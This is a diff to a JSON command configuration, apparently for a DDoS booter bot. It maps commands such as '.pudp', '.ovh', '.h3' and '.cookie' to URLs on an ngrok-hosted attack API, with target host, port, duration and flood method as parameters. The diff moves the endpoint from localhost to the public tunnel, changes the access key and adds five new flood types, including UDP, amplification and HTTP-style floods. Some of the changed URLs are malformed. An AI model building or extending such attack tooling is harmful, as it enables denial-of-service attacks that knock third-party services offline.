@@ -1,6 +1,6 @@
 {
     ".pudp": {
-        "api": "http://127.0.0.1/api/attack?key=spacevin123&host=$host&port=$port&time=$time&method=PUDP",
+        "api": " https://condor-expert-ocelot.ngrok-free.appapi/attack?key=Hikaru&host=$host&port=$port&time=$time&method=PUDP",
         "description": "UDP PPS flood"
     },
     ".game": {
@@ -36,7 +36,7 @@
         "description": "NTP amplification flood"
     },
     ".ovh": {
-        "api": "http://127.0.0.1/api/attack?key=spacevin123&host=$host&port=$port&time=$time&method=OVH",
+        "api": " https://condor-expert-ocelot.ngrok-free.appapi/attack?key=Hikaru&host=$host&port=$port&time=$time&method=OVH",
         "description": "ARD amplification flood"
     },
     ".tcp": {
@@ -56,8 +56,27 @@
         "description": "TLS flood"
     },
     ".gudp": {
-        "api": "http://127.0.0.1/api/attack?key=spacevin123&host=$host&port=$port&time=$time&method=GUDP",
+        "api": " https://condor-expert-ocelot.ngrok-free.appapi/attack?key=Hikaru&host=$host&port=$port&time=$time&method=GUDP",
         "description": "GUDP flood"
+    },
+    ".h3": {
+        "api": "https://condor-expert-ocelot.ngrok-free.app/api/attack?key=Hikaru&host=$host&port=$port&time=$time&method=H3",
+        "description": "H3 flood"
+    },
+    ".handshake": {
+        "api": "https://condor-expert-ocelot.ngrok-free.app/api/attack?key=Hikaru&host=$host&port=$port&time=$time&method=HANDSHAKE",
+        "description": "Handshake flood"
+    },
+    ".spam": {
+        "api": "https://condor-expert-ocelot.ngrok-free.app/api/attack?key=Hikaru&host=$host&port=$port&time=$time&method=SPAM",
+        "description": "Spam flood"
+    },
+    ".cookie": {
+        "api": "https://condor-expert-ocelot.ngrok-free.app/api/attack?key=Hikaru&host=$host&port=$port&time=$time&method=COOKIE",
+        "description": "Cookie flood"
+    },
+    ".raw": {
+        "api": "https://condor-expert-ocelot.ngrok-free.app/api/attack?key=Hikaru&host=$host&port=$port&time=$time&method=RAW",
+        "description": "Raw flood"
     }
 }
-  
